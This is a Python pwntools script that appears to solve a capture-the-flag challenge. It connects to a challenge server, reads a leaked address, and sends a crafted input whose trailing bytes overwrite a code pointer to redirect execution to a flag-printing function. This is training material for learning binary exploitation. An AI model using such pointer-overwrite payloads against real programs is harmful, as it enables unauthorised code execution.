from pwn import *
from sys import stdout

def main():

    remoteProcess   = remote("ctf.compsecu.com", 10101)
    validateLoginRE = 0x404e9b
    callGetFlagRE   = 0x404f6a

    # Get base address
    liveAddress = remoteProcess.recvline()
    stdout.write(f'{liveAddress}\n')
    liveAddress = str(liveAddress).split(" ")[5][2:-3]
    stdout.write(f'BASE ADDRESS:_> {hex(int(liveAddress, 16))}\n')

    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare first input
    sendLine = (b"adonay_") + b"\n"
    # Send first input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare target address
    # ASLRDiff = abs(baseAddress - int(liveAddress, 16))

    # stdout.write(f'ASLR Offset:_> {ASLRDiff}\n')
    # targetAddress = hex(int(liveAddress, 16) + ASLRDiff)

    # stdout.write(f'targetAddress:_> {targetAddress}\n')

    # Prepare second input
    sendLine = (b"adonay_1") + b"\x6a\x4f\x40" + b"\n"
    # Send second input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')
    response = remoteProcess.recvline()
    stdout.write(f'{response}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')

    if "Invalid" not in str(response):
        stdout.write(f'{remoteProcess.recvline()}\n')

if __name__ == "__main__":
    main()
